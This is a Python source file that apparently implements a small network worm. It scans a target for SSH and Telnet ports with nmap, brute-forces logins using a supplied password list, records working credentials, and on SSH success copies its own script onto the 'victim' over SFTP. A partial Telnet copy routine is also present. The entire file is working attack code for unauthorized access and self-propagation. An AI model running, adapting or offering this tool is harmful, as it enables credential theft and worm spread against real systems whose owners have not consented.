import socket
import nmap
import paramiko
from telnetlib import Telnet
from urllib.parse import urlparse
import pathlib
import sys

listOfPasswords=[]
workingIdPasswordsDict={}

def get_hostname(url):
    parsed_url = urlparse(url)
    return parsed_url.hostname

def get_ip_address(url):
    hostname=get_hostname(url)
    ip = socket.gethostbyname(hostname)
    return ip

def scan_open_ports(ip):
    open_ports = []
    scanner = nmap.PortScanner()
    # result = scanner.scan(ip, '1-65535')
    result = scanner.scan(ip, '22,23')
    for protocol in result['scan'][ip].all_protocols():
        ports = result['scan'][ip][protocol].keys()
        open_ports.extend(ports)
    return open_ports

def sendFile(client, ip, service):
    fileToTransfer = pathlib.Path(__file__)
    print("Selected file is ",fileToTransfer)
    # Will make out file names ready
    fileToTransferName = pathlib.PurePath(fileToTransfer).name
    if service == "SSH":
        sshInput, sshOutput, sshError = client.exec_command("ls")
        rawList = sshOutput.readlines()
        lsFileList = [item.strip() for item in rawList]
        # Sending file to the victim using open_sftp
        with client.open_sftp() as ftp:
            if fileToTransferName not in lsFileList:
                ftp.put(fileToTransfer, fileToTransferName)
                print("Transferred File -", fileToTransferName, "to", str(ip) + ":22")
            else:
                print("Found file -", fileToTransferName)

    elif service == "TELNET":
        # Trying with base64
        with open(fileToTransfer, 'r') as f:
            content = f.read()
            command = "echo '" + content + "' >> " + fileToTransferName
            client.write(toBytes(command))
            data = client.read_until(toBytes(">"), timeout=1)


def perform_ssh_attack(ip):
    attackSuccess=False
    usernameLsit=listOfPasswords
    for pwd in listOfPasswords:
        if attackSuccess:
            break
        for username in usernameLsit:
            try:
                with paramiko.client.SSHClient() as client:
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, username=username, password=pwd, allow_agent=False, timeout=10)
                    workingIdPasswordsDict[str(ip)+":22"]=[username,pwd]
                    print("Username -", username, "and Password -", pwd, "worked for", ip + ":22")
                    # sendFile is called once we have a working id password to send a file over the network
                    sendFile(client, ip, "SSH")
                    attackSuccess=True
                    break
            except paramiko.ssh_exception.NoValidConnectionsError as e:
                print("Username does not exist")
                break
            except paramiko.AuthenticationException as e:
                print("Trying with userid,password as ", username,pwd)
            except paramiko.ssh_exception.SSHException as e:
                print("Failed while executing remote command")
            except Exception as e:
                print("*** Caught exception: %s: %s" % (e.__class__, e))
                break

def perform_telnet_attack(ip):
    attackSuccess=False
    usernameLsit=listOfPasswords
    for pwd in listOfPasswords:
        if attackSuccess:
            break
        for username in usernameLsit:
            try:
                with Telnet(ip, 23) as telnet:
                    telnet.read_until(b"login:")
                    telnet.write(toBytes(username))
                    telnet.read_until(b"Password:")
                    telnet.write(toBytes(pwd))
                    data = telnet.read_until(toBytes("Last login:"), timeout=1)
                    data = data.decode("ascii")
                    if "Last login:" in data:
                        print("Working id pwd -", username, "-", pwd)
                        workingIdPasswordsDict[str(ip)+":23"]=[username,pwd]
                        # sendFile is called once we have a working id password to send a file over the network
                        #sendFile(telnet, ip, pwd, "TELNET")
                        attackSuccess=True
                        break
                    else:
                        print("Bad username and password", username, "-", pwd)
            except Exception as e:
                print(e)

#############################################END OF FUNCTION #####################################################

#function toBytes(data)
def toBytes(data):
	return f"{data}\n".encode("utf-8")



################################# START OF FUNCTION ###############################################################
#funtion radingPasswordList(passwordListFileName)  
#Functionality:- 
#	Reading list of passwords for brut forcing.


# def main():
    # url = input("Enter the URL: ")
def scanNetworkMainFunction(url,passwordList):
    # if len(sys.argv) > 1:
    #     url = sys.argv[1]
    #     print("Input provided:", url)
    # else:
    #     print("No input provided.")
    global listOfPasswords
    listOfPasswords=passwordList
    ip = get_ip_address(url)
    print("IP address:", ip)
    open_ports = scan_open_ports(ip)
    print("Open ports:", open_ports)
    
    if 22 in open_ports:
        perform_ssh_attack(ip)
    if 23 in open_ports:
        perform_telnet_attack(ip)

    if(len(workingIdPasswordsDict)>0):
        print("Successfull Attack")
        [print(ipandport,"-",idpwd[0],"-",idpwd[1]) for ipandport,idpwd in workingIdPasswordsDict.items()]
	    # [print(ipandport,"-",idpwd[0],"-",idpwd[1]) for ipandport,idpwd in workingIdPasswordsDict.items()]
        return workingIdPasswordsDict
    else:
        print("Unsccessfull attack")
        return workingIdPasswordsDict